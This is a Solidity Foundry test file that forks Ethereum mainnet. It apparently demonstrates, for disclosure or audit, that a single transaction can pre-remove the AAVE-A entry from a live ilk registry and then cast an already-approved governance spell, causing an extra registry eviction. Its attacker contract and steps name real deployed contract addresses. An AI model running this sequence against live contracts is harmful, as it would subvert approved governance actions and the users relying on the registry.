// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";

interface RegistryRaceLike {
    function count() external view returns (uint256);
    function join(bytes32) external view returns (address);
    function remove(bytes32) external;
}

interface SpellCastLike {
    function cast() external;
    function done() external view returns (bool);
}

/// @dev Demonstrates that no mempool race is required. Once the GSM delay and
/// office-hours conditions permit cast(), one transaction can pre-remove the
/// target and immediately execute the already-approved governance spell.
contract AtomicRemovalRaceAttacker {
    function attack(address registry, bytes32 preRemoveIlk, address spell) external {
        RegistryRaceLike(registry).remove(preRemoveIlk);
        SpellCastLike(spell).cast();
    }
}

contract IlkRegistryAtomicRaceTest is Test {
    uint256 internal constant PRE_CAST_BLOCK = 23_118_263;
    uint256 internal constant SPELL_REMOVE_AUTH_CALLS = 42;

    address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
    address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;
    address internal constant AAVE_JOIN = 0x24e459F61cEAa7b1cE70Dbaea938940A7c5aD46e;
    bytes32 internal constant AAVE_A = "AAVE-A";

    RegistryRaceLike internal constant registry = RegistryRaceLike(REGISTRY);

    function testSingleTransactionChangesApprovedSpellResult() public {
        uint256 cleanFork = vm.createFork("mainnet", PRE_CAST_BLOCK);
        uint256 attackFork = vm.createFork("mainnet", PRE_CAST_BLOCK);

        vm.selectFork(cleanFork);
        uint256 initialCount = registry.count();
        SpellCastLike(CLEANUP_SPELL).cast();
        uint256 cleanCount = registry.count();
        assertEq(cleanCount, initialCount - SPELL_REMOVE_AUTH_CALLS, "invalid clean control");

        vm.selectFork(attackFork);
        assertEq(registry.join(AAVE_A), AAVE_JOIN, "AAVE-A is not available for pre-removal");

        AtomicRemovalRaceAttacker attacker = new AtomicRemovalRaceAttacker();
        attacker.attack(REGISTRY, AAVE_A, CLEANUP_SPELL);

        assertTrue(SpellCastLike(CLEANUP_SPELL).done(), "approved spell did not execute");
        assertEq(
            registry.count(),
            cleanCount - 1,
            "one atomic attacker transaction did not cause an extra registry eviction"
        );
    }
}
